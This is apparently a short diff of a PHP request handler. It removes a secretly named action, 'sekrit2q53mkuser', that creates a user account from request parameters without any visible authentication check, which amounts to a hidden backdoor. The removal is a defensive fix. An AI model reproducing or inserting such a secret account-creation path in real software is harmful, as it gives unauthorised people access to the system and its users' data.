@@ -103,9 +103,6 @@ foreach ($reqs as $reqData) {
 		$out['curuser'] = $curuser;
 		$out['actionsuccess'] = true;
 		break;
-	case 'sekrit2q53mkuser':
-		$users->addUser(array('username'=>$reqData['user']), $reqData['pass']);
-		break;
 	case 'savedata':
 		if (!$_POST) die();
 		$userdata = $curuser['userdata'];
